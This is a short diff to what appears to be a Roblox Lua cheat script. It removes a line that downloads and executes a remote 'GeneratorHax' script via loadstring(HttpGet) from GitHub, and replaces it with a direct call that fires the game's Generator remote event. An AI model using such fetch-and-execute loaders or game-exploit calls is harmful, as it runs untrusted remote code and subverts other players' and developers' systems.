@@ -25,7 +25,7 @@ local function createGeneratorGui()
     -- Button click loads external script
     button.MouseButton1Click:Connect(function()
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Hello3Git/01/refs/heads/main/GeneratorHax"))()
+            workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map"):WaitForChild("Generator"):WaitForChild("Remotes"):WaitForChild("RE"):FireServer()
         end)
     end)
 end
